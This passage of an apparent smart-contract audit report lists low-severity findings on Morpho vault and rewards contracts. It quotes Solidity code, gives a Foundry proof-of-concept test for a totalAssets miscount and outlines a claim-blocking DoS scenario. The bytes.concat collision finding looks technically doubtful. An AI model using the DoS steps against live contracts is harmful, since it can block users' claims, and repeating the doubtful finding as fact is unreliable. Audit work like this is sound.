More specifically to the presented cases, for the first one you could consider accounting for any duplicates during `maxDeposit` to avoid miscalculating the assets that can be supplied. For the second case, I'd suggest at least considering the same strict restrictions in `maxDeposit` than those in deposit. Such as the supply amount being capped to the max `uint128`.



### No check against current root and ipfshash checks are done in subitRoot

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Description
The `submitRoot` function in [UniversalRewardsDistributor](https://github.com/morpho-org/universal-rewards-distributor/blob/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol) does not check if the `newRoot` and `newIfpsHash` variables are the same as the current root and ipfs hash before they are accepted as the new pending values. 

```
    function submitRoot(bytes32 newRoot, bytes32 newIpfsHash) external onlyUpdaterRole {
        
        require(newRoot != pendingRoot.root || newIpfsHash != pendingRoot.ipfsHash, ErrorsLib.ALREADY_PENDING);

        pendingRoot = PendingRoot({root: newRoot, ipfsHash: newIpfsHash, validAt: block.timestamp + timelock});

        emit EventsLib.PendingRootSet(msg.sender, newRoot, newIpfsHash);
    }
```


- Recommendation
The `submitRoot` function can be replaced with:
```
    function submitRoot(bytes32 newRoot, bytes32 newIpfsHash) external onlyUpdaterRole {
        require(newRoot != root || newIpfsHash != ipfsHash, ErrorsLib.ALREADY_SET);
        require(newRoot != pendingRoot.root || newIpfsHash != pendingRoot.ipfsHash, ErrorsLib.ALREADY_PENDING);

        pendingRoot = PendingRoot({root: newRoot, ipfsHash: newIpfsHash, validAt: block.timestamp + timelock});

        emit EventsLib.PendingRootSet(msg.sender, newRoot, newIpfsHash);
    }
```



### Vault’s total assets is miscalculated when it is the fee recipient of Morpho markets

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

The `MetaMorpho::totalAssets` function intends to calculate the total amount of assets held by the vault by iterating through its withdrawal queue, querying each market for the expected supply assets after having accrued interest. These amounts are obtained using the `MorphoBalancesLib::expectedSupplyAssets` function.

Internally, `MorphoBalancesLib::expectedSupplyAssets` queries the supply shares of the vault and then gets the total supply assets and shares with the `MorphoBalancesLib::expectedMarketBalances` function. This last function returns the expected market balances as if they had just accrued interest. But, intendedly, doesn’t account for the shares accrued by the market’s fee recipient.

The `MorphoBalancesLib::expectedSupplyAssets` function also doesn’t account for the accrued fee recipient shares and warns about it in its docstrings. Stating that for a Morpho market’s fee recipient, `MorphoBalancesLib::expectedSupplyAssets` will return a wrong value, lower than the real one.

Interestingly, nothing is preventing a `MetaMorpho` vault from being set as the fee recipient of a Morpho market. In such a scenario, the vault would see its share’s position increased every time the market accrues interest. But, because of how `expectedSupplyAssets` works for the fee recipient, the vault’s `totalAssets` function would fail to account for those shares. It would always return a lower value than the real amount of assets owned by the vault.

The following test scenario presents two cases. They were built upon the existing test suite, using similar starting conditions as other tests in the repository.

In the first case, the MetaMorpho vault is not the fee recipient of the Morpho markets. In the second one, the vault is set as the fee recipient. The different behaviors can be seen in the tests' outputs. While in the first case `totalAssets()` returns the same value prior and after interest accrual (because `totalAssets` already calculates and includes it), in the second one it does not. You can see that `totalAssets` fails to account for the assets assigned to the vault due to being the fee recipient, and therefore reports a lower number of assets than what the vault actually owns. 

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import "./helpers/IntegrationTest.sol";
import "forge-std/console.sol";

contract FeeTestContestVaultIsRecipient is IntegrationTest {
    using Math for uint256;
    using MathLib for uint256;
    using MarketParamsLib for MarketParams;
    using MorphoLib for IMorpho;
    using MathLib for uint128;

    function setUp() public override {
        super.setUp();

        _setFee(0); // no vault's fee

        for (uint256 i; i < NB_MARKETS; ++i) {
            MarketParams memory marketParams = allMarkets[i];

            uint256 marketFee = 0.1e18;
            vm.prank(morpho.owner());
            morpho.setFee(marketParams, marketFee);
            
            // Create some debt on the market to accrue interest.
            loanToken.setBalance(SUPPLIER, MAX_TEST_ASSETS);

            vm.prank(SUPPLIER);
            morpho.supply(marketParams, MAX_TEST_ASSETS, 0, ONBEHALF, hex"");

            uint256 collateral = uint256(MAX_TEST_ASSETS).wDivUp(marketParams.lltv);
            collateralToken.setBalance(BORROWER, collateral);

            vm.startPrank(BORROWER);
            morpho.supplyCollateral(marketParams, collateral, BORROWER, hex"");
            morpho.borrow(marketParams, MAX_TEST_ASSETS, 0, BORROWER, BORROWER);
            vm.stopPrank();
        }

        _setCap(allMarkets[0], CAP);
        _sortSupplyQueueIdleLast();

        // two markets in the vault's queue
        assertEq(vault.supplyQueueLength(), 2);

        morpho.accrueInterest(allMarkets[0]);

        _forward(1); // some time passes
    }

    function testVaultTotalAssetsNotBeingFeeRecipient() public {
        // Vault is not the fee recipient
        assertNotEq(morpho.feeRecipient(), address(vault));

        // Vault starts with zero assets
        assertEq(vault.totalAssets(), 0);

        // Vault starts with zero shares in the market
        assertEq(morpho.supplyShares(allMarkets[0].id(), address(vault)), 0);

        // Supplier deposits assets in the vault
        uint256 toDeposit = 1e18;
        loanToken.setBalance(SUPPLIER, toDeposit);
        vm.prank(SUPPLIER);
        vault.deposit(toDeposit, ONBEHALF);             

        _forward(1); // some time passes

        // The vault is not the fee recipient, so totalAssets() works well in this case.
        // The value it returns already accounts for any accrued interest.
        // Just to confirm, call totalAssets(), then accrueInterest(), and totalAssets() again
        uint256 totalAssetsBefore = vault.totalAssets();
        morpho.accrueInterest(allMarkets[0]);
        uint256 totalAssetsAfter = vault.totalAssets();

        // As expected, the result is the same
        assertEq(totalAssetsBefore, totalAssetsAfter);
    }

    function testVaultTotalAssetsBeingFeeRecipient() public {
        // Set Morpho's fee recipient to the vault
        vm.prank(morpho.owner());
        morpho.setFeeRecipient(address(vault));
        assertEq(morpho.feeRecipient(), address(vault));

        // Vault starts with zero assets
        assertEq(vault.totalAssets(), 0);

        // Vault starts with zero shares in the market
        assertEq(morpho.supplyShares(allMarkets[0].id(), address(vault)), 0);

        // Supplier deposits assets in the vault
        uint256 toDeposit = 1e18;
        loanToken.setBalance(SUPPLIER, toDeposit);
        vm.prank(SUPPLIER);
        vault.deposit(toDeposit, ONBEHALF);             

        _forward(1); // some time passes

        // The vault is the fee recipient, so totalAssets() doesn't work well in this case.
        // It is expected to account for all assets of the vault, including whatever has accrued.
        // But calling totalAssets() before and after interest accrual return different values.abi
        // Meaning that totalAssets() wasn't accounting for accrued assets (assigned to the vault for being the fee recipient).
        uint256 totalAssetsBefore = vault.totalAssets();
        morpho.accrueInterest(allMarkets[0]);
        uint256 totalAssetsAfter = vault.totalAssets();

        console.log("totalAssets() returned:\t\t%d", totalAssetsBefore);
        console.log("totalAssets() should've returned:\t%d", totalAssetsAfter);
        // Therefore totalAssets() miscalculated how many assets the vault actually had, returning a lower value than the real one.
        assertLt(totalAssetsBefore, totalAssetsAfter);
    }
}
```

The output is

```txt
Running 2 tests for test/forge/FeeTestContest.sol:FeeTestContestVaultIsRecipient
[PASS] testVaultTotalAssetsBeingFeeRecipient() (gas: 393578)
Logs:
  totalAssets() returned:	        17007660865553416232
  totalAssets() should've returned:	  33015321742217405608

[PASS] testVaultTotalAssetsNotBeingFeeRecipient() (gas: 384710)
Test result: ok. 2 passed; 0 failed; 0 skipped; finished in 14.64ms
 
Ran 1 test suites: 2 tests passed, 0 failed, 0 skipped (2 total tests)
```

This would not only represent a violation of the ERC4626 spec for `totalAssets`, which states that the `totalAssets` function `Returns the total amount of the underlying asset that is “managed by Vault.”`, but also have consequences downstream, in all functions that query `MetaMorpho::totalAssets`. Overall, the vault will underestimate how many assets it actually owns, falling short at correctly distributing them to the vault's participants.

For example, `totalAssets` is called internally in `MetaMorpho` by `_accruedFeeShares`, which computes the amount of fee shares to mint. Because `totalAssets` will return a lower value than it should, then `_accruedFeeShares` will miscalculate the fee shares and new total assets of the vault. In turn, because `_accruedFeeShares` is used in `_accrueFee`, the latter will end up minting less shares than the appropriate to the `feeRecipient`. What's more, `_accrueFee` is called in multiple important functions of the vault (`deposit`, `mint`, `redeem`, `withdraw`). Meaning that these functions will work under the assumption that the vault has less assets than it actually owns, thus not properly assigning assets to the vault users.

Consider reviewing and specifying the behavior of the vault when it's the fee recipient of Morpho markets, making sure that in such scenario the vault accounts properly for all assets owned. This would entail modifying the `totalAssets` function to include in the interest accrual simulation all the assets assigned to the vault for being the markets' fee recipient.



### Calling bytes.concat() with final arguments that may differ in length, may cause hash collisions

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Description:

The use of `bytes.concat()` with arguments of varying lengths can lead to hash collisions. This is particularly concerning when the function is part of a general-purpose library or a standard used for critical operations like indexing storage slots.

`bytes3(bytes2(uint16(1)))` and `bytes3(bytes3(uint24(256)))` both are equal to `0x000100`, and if they each were passed to a function used them as the last argument to `bytes.concat()`, which is the case in [`UniversalRewardsDistributor.sol#claim()`](https://github.com/morpho-org/universal-rewards-distributor/blob/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L122-L122) function, the resulting bytes would be equivalent.
When this sort of function is a part of a general-purpose library, or is a part of a standard, and is used for e.g. indexing storage slots, it's possible for two byte values to map to the same location. There is no safe way to ensure the caller hasn't cast bytes from a smaller size.

```solidity
	require(
		MerkleProof.verifyCalldata(
	    proof, root, keccak256(bytes.concat(keccak256(abi.encode(account, reward, claimable))))
    ),
    ErrorsLib.INVALID_PROOF_OR_EXPIRED
	);
```

- Proof of Concept

When different byte sequences that vary in length are concatenated using `bytes.concat()`, they can produce identical results. For example, `bytes3(bytes2(uint16(1)))` and `bytes3(bytes3(uint24(256)))` both yield `0x000100`. If such values are used as the final arguments in `bytes.concat()`, the resulting concatenated bytes would be indistinguishable.

- **Impact**: In contexts where the concatenated byte sequence is used for unique identification (like indexing storage slots), this can lead to unexpected behavior or vulnerabilities, as different inputs might map to the same output.

- Recommendation

- **Encoding and Truncation**: Instead of directly using `bytes.concat()`, it is recommended to first encode the values using `keccak256(abi.encode(<value>))`. This approach ensures that the inputs are hashed into a fixed length, reducing the risk of collisions.
- **Truncate Extra Bytes**: If a specific size is required, the extra bytes of entropy from the `keccak256` hash can be truncated to fit the desired length.



### Consider implementing two-step procedure for updating protocol addresses	_(duplicate of [Consider implementing two-step procedure for updating protocol addresses])_

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

A copy-paste error or a typo may end up bricking protocol functionality, or sending tokens to an address with no known private key. Passing an unknown address to skimRecipient is dangerous because `skim` function has no access control and can be called from everyone, which automatically will result in the whole balance of the given `token` being lost.

```solidity
📁 File: metamorpho/src/MetaMorpho.sol

/// @notice Skims the vault `token` balance to `skimRecipient`.
function skim(address token) external {
    if (skimRecipient == address(0)) revert ErrorsLib.ZeroAddress();

    uint256 amount = IERC20(token).balanceOf(address(this));

    IERC20(token).safeTransfer(skimRecipient, amount);

    emit EventsLib.Skim(_msgSender(), token, amount);
}
```

[513-521](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L513-L521)

```solidity
📁 File: metamorpho/src/MetaMorpho.sol

/// @audit line 207
[204](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L204-L210):     function setSkimRecipient(address newSkimRecipient) external onlyOwner { 
205:         if (newSkimRecipient == skimRecipient) revert ErrorsLib.AlreadySet();
206: 
207:         skimRecipient = newSkimRecipient;
208: 
209:         emit EventsLib.SetSkimRecipient(newSkimRecipient);
210:     }

/// @audit line 255
[248](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L248-L258):     function setFeeRecipient(address newFeeRecipient) external onlyOwner { 
249:         if (newFeeRecipient == feeRecipient) revert ErrorsLib.AlreadySet();
250:         if (newFeeRecipient == address(0) && fee != 0) revert ErrorsLib.ZeroFeeRecipient();
251: 
252:         // Accrue interest to the previous fee recipient set before changing it.
253:         _updateLastTotalAssets(_accrueFee());
254: 
255:         feeRecipient = newFeeRecipient;
256: 
257:         emit EventsLib.SetFeeRecipient(newFeeRecipient);
258:     }
```

[204](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L204-L210), [248](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L248-L258)

- Recommendations

Consider implementing a two-step procedure for updating protocol addresses, where the skim and fee recipients are set as pending, and must 'accept' the assignment by making an affirmative call. A straightforward way of doing this would be to have the target contracts implement [EIP-165](https://eips.ethereum.org/EIPS/eip-165), and to have the 'set' functions ensure that the recipient is of the right interface type.



### Solidity version 0.8.20 may not work on other chains due to `PUSH0`	_(duplicate of [Solidity version can cause issues in L2s that do not support PUSH0 opcode])_

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Description

Solidity version 0.8.20 introduces a default target EVM (Ethereum Virtual Machine) version that aligns with the Shanghai update, including the new `PUSH0` opcode. However, this opcode may not be supported on all Layer 2 solutions (L2s), leading to potential deployment failures on these chains. The compatibility issue arises because the pragma directives in the codebase are set to `^0.8.0`, which allows the use of Solidity 0.8.20. Projects integrating with or extending this codebase may face challenges in deploying contracts or libraries due to this incompatibility.

As stated by the Morpho team they are planning to migrate to new chains in the future, that’s why mitigating the problem early will make them not face deployment problems when they decide to do so.

```solidity
📁 File: metamorpho/src/libraries/ConstantsLib.sol
📁 File: metamorpho/src/libraries/ErrorsLib.sol
📁 File: metamorpho/src/libraries/EventsLib.sol
📁 File: morpho-blue-bundlers/src/libraries/ConstantsLib.sol
📁 File: morpho-blue-bundlers/src/libraries/ErrorsLib.sol
📁 File: morpho-blue-irm/src/libraries/ErrorsLib.sol
📁 File: morpho-blue-irm/src/libraries/MathLib.sol
📁 File: morpho-blue-irm/src/libraries/UtilsLib.sol
📁 File: morpho-blue-oracles/src/libraries/ChainlinkDataFeedLib.sol
📁 File: morpho-blue-oracles/src/libraries/ErrorsLib.sol
📁 File: morpho-blue-oracles/src/libraries/VaultLib.sol
📁 File: universal-rewards-distributor/src/libraries/ErrorsLib.sol
📁 File: universal-rewards-distributor/src/libraries/EventsLib.sol
```

**Each of these files may encounter deployment issues on Layer 2 solutions that do not yet support the `PUSH0` opcode introduced in Solidity version 0.8.20.**

- Recommendation

**Specify an Earlier EVM Version:** Adjust the pragma directive in each affected file to explicitly target an earlier EVM version that does not include the `PUSH0` opcode. This can be achieved by setting a specific Solidity version or specifying the target EVM version in the compiler settings.



### setFee() is lacking timelock functionality	_(duplicate of [`setFee` is not time-locked])_

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Description

The `setFee()` lacks a timelock mechanism, contrary to the information in the MetaMorpho readme, which specifies that the function is timelocked.

```solidity
function setFee(uint256 newFee) external onlyOwner {
    if (newFee == fee) revert ErrorsLib.AlreadySet();
    if (newFee > ConstantsLib.MAX_FEE) revert ErrorsLib.MaxFeeExceeded();
    if (newFee != 0 && feeRecipient == address(0)) revert ErrorsLib.ZeroFeeRecipient();

    // Accrue interest using the previous fee set before changing it.
    _updateLastTotalAssets(_accrueFee());

    // Safe "unchecked" cast because newFee <= MAX_FEE.
    fee = uint96(newFee);

    emit EventsLib.SetFee(_msgSender(), fee);
}
```

![Readme](https://gist.github.com/assets/84782275/ee1493a2-67bb-452d-b312-3191dde6c587)

- Recommendation

Please follow the instructions in the readme and integrate the timelock functionality into the setFee function as specified.



### UniversalRewardsDistributor has no invariants for the Merkle root

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Description

As we can see from the contract’s [README](https://github.com/morpho-org/universal-rewards-distributor/blob/main/README.md#attaching-an-ipfs-hash) - There are no invariants specified for the roots which are passed to the `submitRoot` function.

Since rewards distribution through Merkle proof is the main use-case of the **URD** contract, the distributor should be sure that there is no way for `updaters` to behave maliciously. 

Some parts should be improved which will increase the usage of the contract:

1. Updater can pass an IPFS representation of the Merkle root that doesn’t correspond and eventually displays wrong information.
2. There is no pending root queue, which means everybody’s pending root can be replaced by just submitting a new one. 
    
    ```solidity
    Furthermore, if the pending root is ready to be accepted but a root updater suggests a new root simultaneously, the pending root is erased and the timelock restarts. This situation can lead to endless loops of the pending root, especially if an automation mechanism suggests a root at intervals shorter than the timelock.
    ```
    
3. There is a way to DoS other user claims in specific conditions:
    1. [Token](https://github.com/d-xo/weird-erc20#no-revert-on-failure) that doesn’t revert on failure should be used for the rewards.
    2. Timelock is either 0 or a small number
    3. The user submits Merkle root on someone’s behalf passing `type(uint256).max` as claimable.
    4. The root is accepted and the same user calls `claim` effectively DoSsing further tokens claims by the `account`, because:
        
        `require(claimable > claimed[account][reward], ErrorsLib.CLAIMABLE_TOO_LOW);`
        
        since:
        `claimed[account][reward] = claimable == type(uint256).max;` 
        
        https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L127
        
4. Centralization of the whole UniversalRewardsDistributor, as the **owner** can set all the contract critical functions without having to wait for timelock. - https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L127

- Recommendations

Consider the following additions to the `UniversalRewardsDistributor` contract:

1. Make `newIpfsHash` in `submitRoot` mandatory and find a way to validate that it corresponds to the `newRoot` passed as this will remove the @dev warning:
`/// @dev Warning: The initialIpfsHash might not correspond to the initialRoot.` 
2. Add a queue for the pending roots or allow only one to be passed + timelock should be bounded to avoid setting long periods.
3. Add maximum step of tokens that users can claim in one transaction.



### External calls in an un-bounded for-loop may result in a DOS	_(duplicate of [External calls in an un-bounded `for`-loop may result in a DOS])_

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Description

The use of unbounded `for-loops` that make external calls in Solidity contracts can lead to a potential Denial of Service (DoS) vulnerability. This is because the gas cost can become prohibitively high with an increasing number of iterations, potentially causing transactions to fail due to gas limits.

The `MetaMorpho.sol` contract contains `for-loops` that iterate over arrays and make external calls within these loops. Since the length of these arrays is not capped, the number of iterations can grow indefinitely. As the number of iterations increases, the gas cost for executing these loops escalates. This can lead to situations where transactions consistently fail due to exceeding block gas limits, effectively causing a DoS condition.

```solidity
📁 File: metamorpho/src/MetaMorpho.sol

/// @audit line 370
[364](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L364-L380):         for (uint256 i; i < currLength; ++i) {
365:             if (!seen[i]) {
366:                 Id id = withdrawQueue[i];
367:
368:                 if (config[id].cap != 0) revert ErrorsLib.InvalidMarketRemovalNonZeroCap(id);
369:
370:                 if (MORPHO.supplyShares(id, address(this)) != 0) {
371:                     if (config[id].removableAt == 0) revert ErrorsLib.InvalidMarketRemovalNonZeroSupply(id);
372:
373:                     if (block.timestamp < config[id].removableAt) {
374:                         revert ErrorsLib.InvalidMarketRemovalTimelockNotElapsed(id);
375:                     }
376:                 }
377:
378:                 delete config[id];
379:             }
380:         }

/// @audit line 437
/// @audit line 418
[400](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L400-L443):         for (uint256 i; i < allocations.length; ++i) {
401:             MarketAllocation memory allocation = allocations[i];
402:             Id id = allocation.marketParams.id();
403:
404:             (uint256 supplyAssets, uint256 supplyShares,) = _accruedSupplyBalance(allocation.marketParams, id);
405:             uint256 withdrawn = supplyAssets.zeroFloorSub(allocation.assets);
406:
407:             if (withdrawn > 0) {
408:                 if (allocation.marketParams.loanToken != asset()) revert ErrorsLib.InconsistentAsset(id);
409:
410:                 // Guarantees that unknown frontrunning donations can be withdrawn, in order to disable a market.
411:                 uint256 shares;
412:                 if (allocation.assets == 0) {
413:                     shares = supplyShares;
414:                     withdrawn = 0;
415:                 }
416:
417:                 (uint256 withdrawnAssets, uint256 withdrawnShares) =
418:                     MORPHO.withdraw(allocation.marketParams, withdrawn, shares, address(this), address(this));
419:
420:                 emit EventsLib.ReallocateWithdraw(_msgSender(), id, withdrawnAssets, withdrawnShares);
421:
422:                 totalWithdrawn += withdrawnAssets;
423:             } else {
424:                 uint256 suppliedAssets = allocation.assets == type(uint256).max
425:                     ? totalWithdrawn.zeroFloorSub(totalSupplied)
426:                     : allocation.assets.zeroFloorSub(supplyAssets);
427:
428:                 if (suppliedAssets == 0) continue;
429:
430:                 uint256 supplyCap = config[id].cap;
431:                 if (supplyCap == 0) revert ErrorsLib.UnauthorizedMarket(id);
432:
433:                 if (supplyAssets + suppliedAssets > supplyCap) revert ErrorsLib.SupplyCapExceeded(id);
434:
435:                 // The market's loan asset is guaranteed to be the vault's asset because it has a non-zero supply cap.
436:                 (, uint256 suppliedShares) =
437:                     MORPHO.supply(allocation.marketParams, suppliedAssets, 0, address(this), hex"");
438:
439:                 emit EventsLib.ReallocateSupply(_msgSender(), id, suppliedAssets, suppliedShares);
440:
441:                 totalSupplied += suppliedAssets;
442:             }
443:         }

/// @audit line 615
[614](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L614-L616):         for (uint256 i; i < withdrawQueue.length; ++i) {
615:             assets += MORPHO.expectedSupplyAssets(_marketParams(withdrawQueue[i]), address(this));
616:         }

/// @audit line 649
[643](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L643-L652):         for (uint256 i; i < supplyQueue.length; ++i) {
644:             Id id = supplyQueue[i];
645:
646:             uint256 supplyCap = config[id].cap;
647:             if (supplyCap == 0) continue;
648:
649:             uint256 supplyAssets = MORPHO.expectedSupplyAssets(_marketParams(id), address(this));
650:
651:             totalSuppliable += supplyCap.zeroFloorSub(supplyAssets);
652:         }

/// @audit line 811
[798](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L798-L817):         for (uint256 i; i < supplyQueue.length; ++i) {
799:             Id id = supplyQueue[i];
800:
801:             uint256 supplyCap = config[id].cap;
802:             if (supplyCap == 0) continue;
803:
804:             MarketParams memory marketParams = _marketParams(id);
805:             (uint256 supplyAssets,,) = _accruedSupplyBalance(marketParams, id);
806:
807:             uint256 toSupply = UtilsLib.min(supplyCap.zeroFloorSub(supplyAssets), assets);
808:
809:             if (toSupply > 0) {
810:                 // Using try/catch to skip markets that revert.
811:                 try MORPHO.supply(marketParams, toSupply, 0, address(this), hex"") {
812:                     assets -= toSupply;
813:                 } catch {}
814:             }
815:
816:             if (assets == 0) return;
817:         }

/// @audit line 835
[824](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L824-L841):         for (uint256 i; i < withdrawQueue.length; ++i) {
825:             Id id = withdrawQueue[i];
826:             MarketParams memory marketParams = _marketParams(id);
827:             (uint256 supplyAssets,, Market memory market) = _accruedSupplyBalance(marketParams, id);
828:
829:             uint256 toWithdraw = UtilsLib.min(
830:                 _withdrawable(marketParams, market.totalSupplyAssets, market.totalBorrowAssets, supplyAssets), assets
831:             );
832:
833:             if (toWithdraw > 0) {
834:                 // Using try/catch to skip markets that revert.
835:                 try MORPHO.withdraw(marketParams, toWithdraw, 0, address(this), address(this)) {
836:                     assets -= toWithdraw;
837:                 } catch {}
838:             }
839:
840:             if (assets == 0) return;
841:         }

/// @audit line 853
/// @audit line 855
[849](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L849-L871):         for (uint256 i; i < withdrawQueue.length; ++i) {
850:             Id id = withdrawQueue[i];
851:             MarketParams memory marketParams = _marketParams(id);
852:
853:             uint256 supplyShares = MORPHO.supplyShares(id, address(this));
854:             (uint256 totalSupplyAssets, uint256 totalSupplyShares, uint256 totalBorrowAssets,) =
855:                 MORPHO.expectedMarketBalances(marketParams);
856:
857:             // The vault withdrawing from Morpho cannot fail because:
858:             // 1. oracle.price() is never called (the vault doesn't borrow)
859:             // 2. the amount is capped to the liquidity available on Morpho
860:             // 3. virtually accruing interest didn't fail
861:             assets = assets.zeroFloorSub(
862:                 _withdrawable(
863:                     marketParams,
864:                     totalSupplyAssets,
865:                     totalBorrowAssets,
866:                     supplyShares.toAssetsDown(totalSupplyAssets, totalSupplyShares)
867:                 )
868:             );
869:
870:             if (assets == 0) break;
871:         }

```

[364](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L364-L380), [400](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L400-L443), [614](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L614-L616), [643](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L643-L652), [798](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L798-L817), [824](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L824-L841), [849](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L849-L871)

- Recommendation

It is advisable to limit the number of iterations in such `for`-loops. This can be achieved by either capping the array sizes or implementing a mechanism to process a fixed number of elements per transaction.



### Some popular ERC20 tokens revert on approve larger than uint96	_(duplicate of [Large transfers may not work with some `ERC20` tokens])_

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Description

Certain ERC20 tokens, notably `UNI` and `COMP`, have specific behaviors in their `approve` function that can cause compatibility issues with systems expecting standard ERC20 behavior. These tokens revert if the approval amount exceeds `uint96`, and they set the allowance to `type(uint96).max` when the approval amount is `uint256(-1)`.

Both of the above tokens have special case logic in `approve` that sets `allowance` to `type(uint96).max` if the approval amount is `uint256(-1)`, which may cause issues with systems that expect the value passed to `approve` to be reflected in the `allowances` mapping.

```solidity
📁 File: morpho-blue-bundlers/src/BaseBundler.sol

[95](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L95):   ERC20(asset).safeApprove(spender, type(uint256).max);
```

[95](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L95)

```solidity
📁 File: morpho-blue-bundlers/src/StEthBundler.sol

[36](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/StEthBundler.sol#L36):         ERC20(ST_ETH).safeApprove(WST_ETH, type(uint256).max);
```

[36](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/StEthBundler.sol#L36)

- Instances

1. **Contract:** `BaseBundler.sol`
    - **Line**: [95](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L95)
    - **Code Snippet**: `ERC20(asset).safeApprove(spender, type(uint256).max);`
    - **Issue**: The use of `type(uint256).max` in `safeApprove` may not set the expected maximum allowance for tokens with non-standard `approve` behavior.
2. **Contract:** `StEthBundler.sol`
- **Line**: [36](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/StEthBundler.sol#L36)
- **Code Snippet**: `ERC20(ST_ETH).safeApprove(WST_ETH, type(uint256).max);`
- **Issue**: Similar to the above, the use of `type(uint256).max` may lead to unexpected results with certain tokens.

- Recommendation

Implement logic to handle the special cases of tokens like `UNI` and `COMP`. This could involve setting allowances to `type(uint96).max` instead of `uint256(-1)` for known tokens with this behavior.



### Some tokens may revert when large transfer are made	_(duplicate of [Large transfers may not work with some `ERC20` tokens])_

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Description

Certain ERC20 tokens, notably COMP and UNI, have a built-in limitation where transfers that result in an address's balance exceeding `type(uint96).max` will revert. This behavior necessitates careful handling of large transfers to avoid transaction failures.

Tokens like COMP and UNI use a `uint96` type for balances, as seen in the [COMP contract](https://github.com/compound-finance/compound-protocol/blob/a3214f67b73310d547e00fc578e8355911c9d376/contracts/Governance/Comp.sol#L238). This limits the maximum balance an address can hold to `type(uint96).max`.
Any transfer operation that would increase an address's balance beyond this limit will cause the transaction to revert, potentially disrupting the intended flow of funds.

- Instances

1. **Contract**: `MetaMorpho.sol`
    - **Line**: [518](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L518)
    - **Code Snippet**: `IERC20(token).safeTransfer(skimRecipient, amount);`
    - **Issue**: Potential revert if `amount` causes `skimRecipient`'s balance to exceed `type(uint96).max`.
2. **Contract**: `TransferBundler.sol`
    - **Line**: [51](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/TransferBundler.sol#L51)
    - **Code Snippet**: `ERC20(asset).safeTransfer(recipient, amount);`
    - **Issue**: Similar risk of revert if `amount` exceeds the balance limit for `recipient`.
3. **Contract**: `UniversalRewardsDistributor.sol`
    - **Line**: [133](https://github.com/morpho-org/universal-rewards-distributor/blob/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L133)
    - **Code Snippet**: `ERC20(reward).safeTransfer(account, amount);`
    - **Issue**: Risk of revert during reward distribution if `amount` is too large for the `account`.

- Recommendation

